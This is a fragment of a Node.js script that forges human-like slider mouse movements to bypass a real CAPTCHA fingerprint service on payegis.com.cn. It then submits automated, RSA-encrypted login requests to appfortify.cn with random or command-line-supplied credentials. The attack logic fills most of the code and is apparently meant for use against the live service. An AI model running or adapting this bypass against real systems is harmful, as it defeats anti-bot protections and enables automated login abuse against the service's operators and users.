				    	return special_base64(str, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
				    };
				    var randomBytes = function(length) {
				        length = length || 32;
				        var d = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", c = d.length, e = "";
				        for (var i = 0; i < length; i++)
				            e += d.charAt(Math.floor(Math.random() * c));
				        return e
				    };
				    var callback = "____PEF" + randomInt(1E7) + "___";
				    var startX = 570 + randomInt(10), startY = 280 + randomInt(10);
				    var startTime = sats + 5 * 1000 + randomInt(10 * 1000);
				    var x = startX, y = startY, t = startTime - 150 - randomInt(300);
				    var buffer = [x + "," + y + "," + t];
				    for(var i = 0; i < 4; i ++) {
				    	x -= randomInt(1);
				    	if(i == 3) y += randomInt(2) - 1;
				    	t -= 1 + randomInt(30);
				    	buffer.unshift(x + "," + y + "," + t); 
				    }
				    print("buffer: " + (hide ? "[hide]" : JSON.stringify(buffer)));
				    x = startX, y = startY, t = startTime;
				    var moveList = [x + "," + y + "," + t],
				    	length = 35 + randomInt(11),
				    	step = 200 / length;
				    for(var i = 0; i < length; i ++) {
				    	x = Math.round(startX + i * step + randomInt(step));
				    	if(randomInt(10) < 3) 
				    		y = y + randomInt(2) - 1;
				    	t = 4 + randomInt(18);
				    	if(i == length - 1)
				    		t += 200 + randomInt(200);
				    	moveList.push(x + "," + y + "," + t); 
				    }
				    print("move list: " + (hide ? "[hide]" : JSON.stringify(moveList)));
				    var d = randomBytes(3) + base64(randomBytes(3) + base64(buffer.join(";") + "#" + moveList.join(";")) + "|" + randomBytes(3) + base64([].join(",")));
				    var p_options = {
				    	url: "http://pws.payegis.com.cn/did/fp/profile.png?appId=" + appId + "&sessionId=" + sessionId + "&t=" + Math.random() + "&c=" + encodeURIComponent(callback) + "&d=" + encodeURIComponent(d),
				    	headers: {	
							'Referer': location,
							'Connection': 'keep-alive',
							'Accept': '*/*',
							'Accept-Language': 'zh-cn',
						    'User-Agent': ua
						}
					};
				    print("data: " + (hide ? "[hide]" : d));
					print("profile.png ...");
					// 滑动验证
				    request.get(p_options, function(error, response, body) {
				    	highlight("profile result: " + (body.indexOf("(0)") > 0 ? "success" : "failed") + " ==> " + body);
					    var rsa = require("node-rsa");
					    var key = new rsa("MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCmDwDNgicOKc3KPfqHVnOjI6KKm6vQP6Nzi/bJ+Y5pxeZUg3N42nNq3ukYLVLAb0wiq0sRvmnBqTfq2MRed9uQ4udjfJJcKAjRvP/ponwjGGwWn6zisqN16TUqZ8II6bcVdeRpSk07zLgbwekxJ2GC2QiaZGTYP5Wtxgx4r1woowIDAQAB", "public");
					    var email = "fuck" + randomBytes(5) + "@payegis.com",
					    	password = randomBytes(10);
                        if(process.argv.length == 4) {
                            email = process.argv[2];
                            password = process.argv[3];
                        }
					    print("login email [" + email + "] password [" + password + "]");
					    var login_options = {
					    	url: "http://appfortify.cn/doLoginLink",
					    	form: {
					    		email: email,
					    		fakePassword: "",
					    		password: key.encrypt(password)
					    	},
					    	headers: {
								'Referer': location,
								'Connection': 'keep-alive',
								'Accept': 'application/json, text/javascript, */*; q=0.01',
								'Accept-Language': 'zh-cn',
								'X-Requested-With': 'XMLHttpRequest',
							    'User-Agent': ua
					    	}
					    };
					    // 登陆请求
					    request.post(login_options, function(error, response, body) {
					    	highlight("login result: " + body);
					    });
				    });
				});
			} catch (e){
				console.error(e);
			}
		});
	});
});

